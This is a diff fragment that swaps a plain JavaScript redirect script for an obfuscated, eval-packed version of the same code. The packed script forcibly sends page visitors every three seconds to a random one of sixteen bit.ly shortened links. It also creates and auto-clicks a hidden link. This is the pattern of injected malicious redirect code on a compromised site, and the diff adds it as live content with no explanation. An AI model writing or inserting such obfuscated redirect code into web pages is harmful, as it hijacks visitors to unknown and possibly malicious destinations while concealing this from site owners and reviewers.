@@ -1,12 +1,1 @@
-<script type="text/javascript">
-
-var urls = new Array("http://bit.ly/2PGNPGZ", "http://bit.ly/2ysi4L8", "http://bit.ly/2Ct3WV3", "http://bit.ly/2ynYqQu", "http://bit.ly/2CQ5Fo8", "http://bit.ly/2q1E0IE", "http://bit.ly/2NP8E16", "http://bit.ly/2J6sNiy", "http://bit.ly/2J4TeFr", "http://bit.ly/2J4LVh1", "http://bit.ly/2PDppyg", "http://bit.ly/2Cqoz3X", "http://bit.ly/2q2dy1v", "http://bit.ly/2NQUI6W", "http://bit.ly/2OwxWGO", "http://bit.ly/2yrk9XN");
-
-function redirect()
-{
-window.location = urls[Math.floor(urls.length*Math.random())];
-}
-
-var temp = setInterval("redirect()", 3000);
-
-</script>
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('<8 m="l/k">5 4=j n("1://0.2/o","1://0.2/r","1://0.2/i","1://0.2/p","1://0.2/s","1://0.2/f","1://0.2/c","1://0.2/b","1://0.2/d","1://0.2/e","1://0.2/h","1://0.2/g","1://0.2/q","1://0.2/B","1://0.2/F","1://0.2/t");E 9(){D.G=4[6.H(4.J*6.I())]}5 3=7.C(\'a\');3.w=4;7.v.u(3);3.x();5 y=A("9()",z);</8>',46,46,'bit|http|ly|referLink|urls|var|Math|document|script|redirect||2J6sNiy|2NP8E16|2J4TeFr|2J4LVh1|2q1E0IE|2Cqoz3X|2PDppyg|2Ct3WV3|new|javascript|text|type|Array|2PGNPGZ|2ynYqQu|2q2dy1v|2ysi4L8|2CQ5Fo8|2yrk9XN|appendChild|body|href|click|temp|3000|setInterval|2NQUI6W|createElement|window|function|2OwxWGO|location|floor|random|length'.split('|')))
